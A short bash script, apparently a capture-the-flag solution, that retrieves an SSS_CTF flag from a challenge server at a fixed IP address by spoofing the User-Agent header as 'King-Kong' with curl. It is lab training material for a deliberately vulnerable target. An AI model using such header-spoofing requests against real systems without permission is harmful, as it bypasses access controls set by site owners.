#!/bin/bash
PORT=8086

if [[ $1 == "local" ]]
then
    remote='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    remote='http://141.85.224.118:'$PORT
else
    remote=$1':'$2
fi

# King-Kong
echo "Start exploit for King-Kong"
remote=$remote'/king-kong/'
flag=$(curl -s -A 'King-Kong' $remote | grep -o "SSS_CTF{.*}")
echo "Flag is $flag"
echo "----------------------------"
